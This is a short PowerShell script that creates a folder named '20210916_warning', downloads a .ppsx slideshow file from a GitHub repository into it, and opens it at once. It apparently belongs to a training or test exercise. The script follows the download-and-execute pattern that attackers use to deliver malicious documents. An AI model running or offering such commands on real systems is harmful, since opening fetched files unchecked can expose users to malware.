New-Item C:\20210916_warning -ItemType Directory
(New-Object System.Net.WebClient).DownloadFile("https://github.com/Kazuma542/Training/blob/main/20210916_Trainig.ppsx?raw=true","C:\20210916_warning\20210916_Trainig.ppsx")
invoke-item C:\20210916_warning\20210916_Trainig.ppsx
